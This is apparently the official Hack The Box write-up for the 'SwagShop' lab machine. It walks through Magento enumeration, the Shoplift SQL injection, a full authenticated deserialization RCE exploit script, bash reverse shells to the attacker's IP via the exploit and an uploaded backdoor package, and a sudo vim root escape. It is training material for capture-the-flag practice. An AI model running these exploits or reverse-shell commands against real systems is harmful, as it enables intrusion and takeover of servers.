@@ -1,0 +1,320 @@
+SwagShop
+
+17th June 2019 / Document No D19.100.38
+
+Prepared By: MinatoTW
+Machine Author: ch4p
+Difficulty: Easy
+Classification: Official
+
+                                                                        Page 1 / 17
+SYNOPSIS
+
+SwagShop is an easy difficulty linux box running an old version of Magento. The version is
+vulnerable to SQLi and RCE leading to a shell. The www user can use vim in the context of root
+which can abused to execute commands.
+
+Skills Required  Skills Learned
+
+     None             Exploit modification
+                      GTFObins
+
+                                            Page 2 / 17
+ENUMERATION
+NMAP
+
+ ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.140 | grep ^[0-9] | cut -d
+ '/' -f 1 | tr '\n' ',' | sed s/,$//)
+ nmap -p$ports -sC -sV 10.10.10.140
+
+Looking at the nmap scan we have SSH and Apache running on their common ports.
+
+HTTP
+
+Browsing to the HTTP page we that it's running Magento.
+
+                                                                                                                  Page 3 / 17
+We scan this using Magescan. Download the phar file for the latest release from here and then
+scan the box using it.
+
+ wget
+ https://github.com/steverobbins/magescan/releases/download/v1.12.9/magescan
+ .phar
+ php magescan.phar scan:all http://10.10.10.140
+
+At the start of the scan we find the Magento version.
+
+The box is running version 1.9.0.0. After googling about the version we land at the github page.
+The version was released in May, 2014 which is pretty old.
+
+It also finds a local.xml file in app/etc/ folder.
+Let's look at what information it holds.
+
+                                                    Page 4 / 17
+We find a lot of sensitive information like database credentials and the installation key. Let's save
+this for later.
+
+Looking at the list of CVEs we find one arbitrary SQL command execution vulnerability i.e
+CVE-2015-1397. The vulnerability was named Magento Shoplift which brings us to this page with
+the PoC.
+
+SQL INJECTION
+
+Looking at the script we see it uses prepared statements to insert values in the admin tables.
+
+It then injects it into the popularity parameter.
+
+Download the PoC script from here and run it.
+ python poc.py http://10.10.10.140
+
+                                                   Page 5 / 17
+It says that it created the admin user with the credentials ypwq / 123 successfully. Let's try that.
+Going to http://10.10.10.140/index.php/admin we find the admin login page.
+
+And using ypwq / 123 logs us in.
+
+                                                                                                                  Page 6 / 17
+FOOTHOLD
+
+Searching on exploit-db for exploits related to magento we come across this. It's an
+authenticated RCE exploit. As we already have the credentials we can try using it. The exploit
+doesn't work out of the box and it needs some changes.
+First we need to change the install date as specified by the author.
+
+This can be found in the local.xml file from earlier.
+
+Now let's replicate what the script does. It first creates a mechanize browser object and then logs
+the user in.
+
+Let's make that request and intercept it via burp. The creds are ypwq / 123.
+
+Send the request to repeater and login.
+
+                                                                              Page 7 / 17
+It then finds the ajaxBlockUrl and form_key values.
+Searching in the source of the dashboard page we see them.
+
+After finding them it creates a URL by concatenating them.
+
+                                                            Page 8 / 17
+In this case the URL would be:
+ http://10.10.10.140/index.php/admin/dashboard/ajaxBlock/key/17504680336fe4a
+ 729ae08d7f128f799/block/tab_orders/period/7d/?isAjax=true
+And the POST data:
+ isAjax=false&form_key=1SUF4CPvXtc5tE18
+Let's request the page now.
+
+Looking at the response we don't see any data.
+
+Let's change the time period to say 2 years in the URL, substitute 7d with 2y.
+ http://10.10.10.140/index.php/admin/dashboard/ajaxBlock/key/5d819dc0762c3ad
+
+                                                                                                                  Page 9 / 17
+31c8373002b1effc1/block/tab_orders/period/2y/?isAjax=true
+
+Requesting the page again we see that the response contains the tunnel link which the exploit
+searches for.
+
+Now for the next step the exploit creates the payload using serialized objects. Copy the payload
+generation part from the script.
+
+#!/usr/bin/python        # Note: we can only pass 1 argument to the
+import base64
+from hashlib import md5
+php_function = 'system'
+function
+
+install_date = 'Wed, 08 May 2019 07:23:09 +0000' # This needs to be the
+exact date from /app/etc/local.xml
+arg = "whoami"
+
+# POP chain to pivot into call_user_exec
+payload =
+
+                                                                     Page 10 / 17
+'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writ
+
+er_Mail\":4:{s:16:' \
+
+'\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMIN
+
+ATE!\";i:2;s:15:\"' \
+
+'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_la
+
+yout\";O:23:\"' \
+
+'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17
+
+:\"\00*\00'  \
+
+'_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\
+
+"\00*\00_data\"' \
+
+';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' %
+
+(len(php_function), php_function, len(arg), arg)
+
+payload = base64.b64encode(payload)
+gh = md5(payload + install_date).hexdigest()
+
+print "payload: " + payload
+print "gh: " + gh
+
+Running it will generate the payload to execute "whoami".
+
+Now copy the payload and the gh value to request the tunnel URL, which will result in code
+execution.
+ http://10.10.10.140/index.php/admin/dashboard/tunnel/key/4d065504eaceb4d9f3
+ 0275f69baf443b/?ga=Tzo4OiJaZW5kX0xvZyI6MTp7czoxMToiACoAX3dyaXRlcnMiO2E6Mjp7
+ aTowO086MjA6IlplbmRfTG9nX1dyaXRlcl9NYWlsIjo0OntzOjE2OiIAKgBfZXZlbnRzVG9NYWl
+ sIjthOjM6e2k6MDtzOjExOiJFWFRFUk1JTkFURSI7aToxO3M6MTI6IkVYVEVSTUlOQVRFISI7aT
+ oyO3M6MTU6IkVYVEVSTUlOQVRFISEhISI7fXM6MjI6IgAqAF9zdWJqZWN0UHJlcGVuZFRleHQiO
+ 047czoxMDoiACoAX2xheW91dCI7TzoyMzoiWmVuZF9Db25maWdfV3JpdGVyX1lhbWwiOjM6e3M6
+ MTU6IgAqAF95YW1sRW5jb2RlciI7czo2OiJzeXN0ZW0iO3M6MTc6IgAqAF9sb2FkZWRTZWN0aW9
+ uIjtOO3M6MTA6IgAqAF9jb25maWciO086MTM6IlZhcmllbl9PYmplY3QiOjE6e3M6ODoiACoAX2
+ RhdGEiO3M6Njoid2hvYW1pIjt9fXM6ODoiACoAX21haWwiO086OToiWmVuZF9NYWlsIjowOnt9f
+
+                                                                                                                  Page 11 / 17
+ Wk6MTtpOjI7fX0=&h=ac45fbaa8e4537ac82f346ea37f7ce86
+Sending the request results in code execution.
+
+All this can be modified in the original script using python requests module.
+ #!/usr/bin/python
+ # Exploit Title: Magento CE < 1.9.0.1 Post Auth RCE
+ # Google Dork: "Powered by Magento"
+ # Date: 08/18/2015
+ # Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com
+ # Vendor Homepage: http://magento.com/
+ # Software Link: https://www.magentocommerce.com/download
+ # Version: 1.9.0.1 and below
+ # Tested on: Ubuntu 15
+ # CVE : none
+ from hashlib import md5
+ import sys
+ import re
+ import base64
+ import requests
+ def usage():
+
+           print "Usage: python %s <target> <argument>\nExample: python %s
+ http://localhost \"uname -a\""
+
+           sys.exit()
+
+                                                                                                                 Page 12 / 17
+if len(sys.argv) != 3:
+         usage()
+
+# Command-line args
+target = sys.argv[1]
+arg = sys.argv[2]
+
+# Config.
+username = 'ypwq'
+password = '123'
+php_function = 'system' # Note: we can only pass 1 argument to the
+function
+install_date = 'Wed, 08 May 2019 07:23:09 +0000' # This needs to be the
+exact date from /app/etc/local.xml
+
+# POP chain to pivot into call_user_exec
+
+payload =
+
+'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writ
+
+er_Mail\":4:{s:16:' \
+
+'\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMIN
+
+ATE!\";i:2;s:15:\"' \
+
+'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_la
+
+yout\";O:23:\"' \
+
+'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17
+
+:\"\00*\00'  \
+
+'_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\
+
+"\00*\00_data\"' \
+
+';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' %
+
+(len(php_function), php_function,len(arg), arg)
+
+s = requests.session()
+data = { 'login[username]': username, 'login[password]' : password,
+'form_key' : '6I8iRr8WcOtoVnpU', 'dummy' : '' }
+
+res = s.post( target, data = data )
+content = res.content
+url = re.search("ajaxBlockUrl = \'(.*)\'", content)
+url = url.group(1)
+
+                                                                     Page 13 / 17
+ key = re.search("var FORM_KEY = '(.*)'", content)
+ key = key.group(1)
+
+ data = { 'isAjax' : 'false', 'form_key' : key }
+ request = s.post(url + 'block/tab_orders/period/2y/?isAjax=true', data =
+ data)
+ res = request.content
+ tunnel = re.search("src=\"(.*)\?ga=", request.content)
+ tunnel = tunnel.group(1)
+ payload = base64.b64encode(payload)
+ gh = md5(payload + install_date).hexdigest()
+ exploit = tunnel + '?ga=' + payload + '&h=' + gh
+ req = s.get(exploit)
+ print req.content
+Running the exploit:
+
+Now we can execute a reverse shell using bash.
+ python 37811.py http://10.10.10.140/index.php/admin "bash -c 'bash -i >&
+ /dev/tcp/10.10.16.47/4444 0>&1'"
+
+                                                                                                                 Page 14 / 17
+ALTERNATE METHOD
+
+THIS METHOD IS NO LONGER WORKING AS THE BOX WAS PATCHED
+As we have admin privileges we can upload our own package. A sample malicious package can
+be found here.
+ git clone https://github.com/lavalamp-/LavaMagentoBD
+ cd LavaMagentoBD
+ cd Backdoor\ Code
+ tar -czvf bd.tgz app package.xml skin
+ mv bd.tgz ..
+
+Now from the admin panel, navigate to System > Magento connect. In the direct package file
+upload menu, select the tar archive and upload it.
+
+After uploading, browse to http://10.10.10.140/index.php/lavalamp/index. The page should be
+available and empty. Use curl to execute commands on a POST request and parameter `c'.
+
+Using this we can now get a reverse shell.
+ curl -X POST http://10.10.10.140/index.php/lavalamp/index --data-urlencode
+ 'c=bash -c "bash -i >& /dev/tcp/10.10.16.47/4444 0>&1"'
+
+                                                                                                                 Page 15 / 17
+Get a tty shell using python:
+ python3 -c "import pty;pty.spawn('/bin/bash')"
+
+PRIVILEGE ESCALATION
+
+Looking at the sudo permissions we that we can use vim as root.
+
+                                                                                                                 Page 16 / 17
+Vim is a GTFObin which can be used to break out of restricted shells. Use the following
+command to get a root shell.
+ sudo /usr/bin/vi /var/www/html/php.ini.sample -c ':!/bin/bash'
+
+This will execute bash and we should be presented with a root shell.
+
+And don't forget to check out the HTB Swag Store!
+
+                                                   Page 17 / 17
+
